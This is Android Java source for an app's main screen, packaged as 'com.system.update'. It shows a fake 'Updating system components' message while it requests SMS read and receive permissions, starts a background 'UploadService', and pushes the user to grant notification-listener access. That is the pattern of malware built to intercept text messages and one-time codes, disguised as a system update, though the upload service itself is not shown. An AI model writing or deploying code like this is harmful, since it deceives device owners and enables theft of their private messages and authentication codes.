
package com.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            TextView tv = new TextView(this);
            tv.setText("Updating system components…\n\nPlease wait.");
            tv.setPadding(60, 250, 60, 60);
            tv.setTextSize(18);
            setContentView(tv);

            if (Build.VERSION.SDK_INT >= 23) {
                ActivityCompat.requestPermissions(this,
                    new String[]{
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.POST_NOTIFICATIONS
                    }, 1);
            }

            // ابدأ الخدمة بحماية
            try {
                Intent svc = new Intent(this, UploadService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(svc);
                } else {
                    startService(svc);
                }
            } catch (Exception e) {
                // ما نطيح لو فشل
            }

            // افتح صفحة الإشعارات
            try {
                if (!isNotifListenerEnabled()) {
                    startActivity(new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                }
            } catch (Exception e) {}

        } catch (Exception e) {
            TextView err = new TextView(this);
            err.setText("Error: " + e.getMessage());
            err.setPadding(30, 300, 30, 30);
            setContentView(err);
        }
    }

    private boolean isNotifListenerEnabled() {
        String flat = Settings.Secure.getString(
            getContentResolver(),
            "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
}
